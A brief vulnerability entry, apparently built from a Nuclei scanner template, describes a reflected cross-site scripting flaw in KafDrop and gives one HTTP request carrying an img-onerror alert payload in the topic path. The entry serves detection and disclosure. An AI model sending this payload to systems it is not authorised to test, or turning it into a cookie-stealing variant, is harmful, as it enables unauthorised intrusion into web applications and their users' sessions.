# Vulnerability: KafDrop - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`kafdrop-xss.yaml`)

## Description
KafDrop contains a cross-site scripting vulnerability. It allows remote unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the response returned by the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
```

